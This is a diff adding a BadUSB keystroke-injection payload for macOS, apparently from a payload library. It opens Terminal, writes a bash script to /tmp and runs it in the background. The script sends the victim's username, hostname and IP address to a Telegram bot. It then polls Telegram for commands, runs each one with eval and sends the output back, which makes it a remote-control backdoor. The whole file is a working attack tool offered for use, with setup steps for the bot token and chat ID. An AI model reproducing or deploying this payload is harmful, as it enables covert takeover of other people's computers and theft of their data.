@@ -1,0 +1,78 @@
+REM Title: macOS Telegram C2 Client
+REM Author: BadUSB Library
+REM Description: Creates a Command & Control client using Telegram
+REM Target: macOS 10.15+
+REM Category: Command & Control
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create Telegram C2 client
+STRING cat > /tmp/telegram_c2.sh << 'EOF'
+#!/bin/bash
+
+# Telegram configuration
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Function to send message to Telegram
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="$1"
+}
+
+# Function to get updates from Telegram
+get_updates() {
+    curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates" | \
+    python3 -c "
+import sys, json
+data = json.load(sys.stdin)
+if data['result']:
+    for update in data['result']:
+        if 'message' in update and 'text' in update['message']:
+            print(update['message']['text'])
+"
+}
+
+# Send initial message
+send_telegram "🤖 macOS C2 Client Connected"
+send_telegram "User: $(whoami)"
+send_telegram "Hostname: $(hostname)"
+send_telegram "IP: $(ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}')"
+
+# Main C2 loop
+while true; do
+    # Get commands from Telegram
+    command=$(get_updates | tail -1)
+    
+    if [ ! -z "$command" ]; then
+        # Execute command
+        result=$(eval "$command" 2>&1)
+        
+        # Send result back
+        send_telegram "Command: $command"
+        send_telegram "Result: $result"
+    fi
+    
+    sleep 5
+done
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/telegram_c2.sh
+ENTER
+STRING nohup /tmp/telegram_c2.sh > /dev/null 2>&1 &
+ENTER
